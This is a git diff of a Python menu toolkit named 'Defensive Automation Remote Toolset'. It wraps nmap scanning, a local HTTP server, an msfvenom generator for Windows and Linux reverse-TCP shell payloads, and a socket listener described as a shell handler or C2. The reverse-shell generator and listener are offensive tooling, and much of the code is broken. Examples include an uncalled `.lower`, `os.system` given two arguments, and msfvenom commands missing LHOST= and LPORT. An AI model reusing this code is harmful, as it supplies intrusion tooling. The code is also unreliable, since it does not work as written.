@@ -1,6 +1,10 @@
 import os
 import nmap 
 import socket
+import platform
+from colorama import Fore
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from html import escape
 
 class banner:
     def __init__(self,banner1,banner2,banner3):
@@ -19,6 +23,21 @@ class shell_stuff:
     def __init__(self,msfv):
         self.msfv = msfv
 
+class MyServer(BaseHTTPRequestHandler):
+    def do_GET(self):
+        # Send response status code
+        self.send_response(200)
+        
+        # Send headers
+        self.send_header("Content-type", "text/html")
+        self.end_headers()
+
+        # Write HTML content
+        self.wfile.write(bytes("<html><head><title>Secret_Info</title></head>", "utf-8"))
+        # Use escape to safely render the request path
+        self.wfile.write(bytes("<body><p>Request: %s</p>" % escape(self.path), "utf-8"))
+        self.wfile.write(bytes("<p>Passwords are stored on a Dir within this website.</p>", "utf-8"))
+        self.wfile.write(bytes("</body></html>", "utf-8"))
 
 
 menu.nmap = """ 
@@ -38,14 +57,14 @@ menu.main = """
 
 [1] Nmap Interface 
 [2] Start Python Http Server 
-[3] Shells  
-[4] Start C2
+[3] Shell Maker
+[4] Shell Handler
+[5] Info for nerds
 
 """
 
 banner.banner1 = "        Defensive Automation Remote Toolset"
 banner.banner2 = "        https://github.com/Richycam"
-
 banner.banner3 =""" 
                                 _____  ___  ______ ______
                                 |  _  \/ _ \ | ___ \_   _|
@@ -53,8 +72,7 @@ banner.banner3 ="""
                                 | | | |  _  ||    /  | |  
                                 | |/ /| | | || |\ \  | |  
                                 |___/ \_| |_/\_| \_| \_/  
-                          
-                                                     
+                                                                              
 """
 
 def flow_handler():
@@ -63,16 +81,6 @@ def flow_handler():
         clear()
 
 
-def win_shells():
-    oper_sys_win ="/windows/shell_reverse_tcp/"
-    exe_elf_win = "-f exe"
-    shell_name_win = "shell.exe"
-
-def linux_shells():
-    x_type = input("x86 or x64? \n DAT> ")
-    oper_sys = "/linux/{0}/shell_reverse_tcp/".format(shell_linux.x_type)
-    exe_elf = "-f elf"
-    shell_name = "shell.elf"
 
 def opt_1():
     clear()
@@ -96,34 +104,46 @@ def opt_1():
             nmap.PortScanner.command_line("nmap {0} -6".format(ip_add.rhost))
         case "b":
             clear()
-        
+    flow_handler()
 
 def opt_2():
-    srv_port = input("Port to use?")
-    srv_start = "python3 -m http.server {0}".format(srv_port)
-    print(" ctrl + c to shut down server")
-    os.system(srv_start)
-    clear()
-    ("\n")
+    hostName = "localhost"
+    serverPort = 8080
+    if __name__ == "__main__":        
+    # Correct initialization of HTTPServer with MyServer handler
+        webServer = HTTPServer((hostName, serverPort), MyServer)
+        print("Server started http://%s:%s" % (hostName, serverPort))
+
+        try:
+            webServer.serve_forever()
+        except KeyboardInterrupt:
+            pass
+
+        webServer.server_close()
+        print("Server stopped.")
 
 
 def opt_3():
     print("the shell should be created in your home directory \n ")
+    ## // WINDOWS
     check_1 = input("Windows or linux? \n DAT> ").lower
-    match check_1:
-        case "windows":
-            win_shells()
-        case "linux":
-            linux_shells()
+    oper_sys_win ="/windows/shell_reverse_tcp/"
+    exe_elf_win = "-f exe"
+    shell_name_win = "shell.exe"
+    ## // LINUX
+    x_type = input("x86 or x64? \n DAT> ")
+    oper_sys = "/linux/{0}/shell_reverse_tcp/".format(x_type)
+    exe_elf = "-f elf"
+    shell_name = "shell.elf"
     
-    misc.lhost = input("Lhost (Local Host) \n DAT> ")
+    lhost = input("Lhost (Local Host) \n DAT> ")
     
-    alltogether_msf_win = ("msfvenom -p {0} {1} {2} > {3}").format(oper_sys,lhost,exe_elf,shell_name)
+    alltogether_msf_win = ("msfvenom -p {0} {1} {2} > {3}").format(oper_sys_win,lhost,exe_elf_win,shell_name_win)
     alltogether_msf = ("msfvenom -p {0} {1} {2} > {3}").format(oper_sys,lhost,exe_elf,shell_name)
     if check_1 == "windows":
-        os.system(alltogether_msf_win)
+        os.system("sudo",alltogether_msf_win)
     elif check_1 == "linux":
-        os.system(alltogether_msf)
+        os.system("sudo",alltogether_msf)
     flow_handler()
     clear()
 
@@ -132,7 +152,9 @@ def opt_4():
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.bind((host, port))
             s.listen()
-            print(f"Server started at {host}:{port}")
+            print(f"Server started at LOCALHOST:: {host}:{port}")
+            print(" Host Network Details:","\n" )
+            os.system('ipconfig' if os.name == 'nt' else 'ifconfig')
             conn, addr = s.accept()
             with conn:
                 print(f"Connected by {addr}")
@@ -147,17 +169,34 @@ def opt_4():
     if __name__ == "__main__":
         start_server()
 
+def opt_5():
+    print(f"Host :{platform.node()}")
+    print(f"proc :{platform.processor()}")
+    print(f"arch :{platform.architecture()}")
+    print(f"mach :{platform.machine()}")
+    print(f"plat :{platform.platform()}")
+    print(f"sys :{platform.system()}")
+    print(f"uname :{platform.uname()}")
+    print(f"PyVer :{platform.python_version()}")
+    flow_handler()
+
 def main():
     clear()
+
     cntrl_main = True
     while cntrl_main:
         clear()
-        print(banner.banner3)
-        print(banner.banner1)
-        print(banner.banner2)
+        print(Fore.GREEN + banner.banner3)
+        print(Fore.GREEN +banner.banner1)
+        print(Fore.RED + banner.banner2)
+        print(Fore.RESET)
+        print(f"Host: {platform.node()}")
+        print(platform.system())
+        print("Windows is not Reccmmended"if os.name== "nt" else"")
+
         print(menu.main)
         
-        choose = input("DAT>")
+        choose = input("DART>")
         clear()
         
         match choose: 
@@ -173,5 +212,8 @@ def main():
             case "4":
                 opt_4() #C2 start
                 continue
-
+            case "5":
+                opt_5() # Nerdy stuff
+                continue
+            
 main()
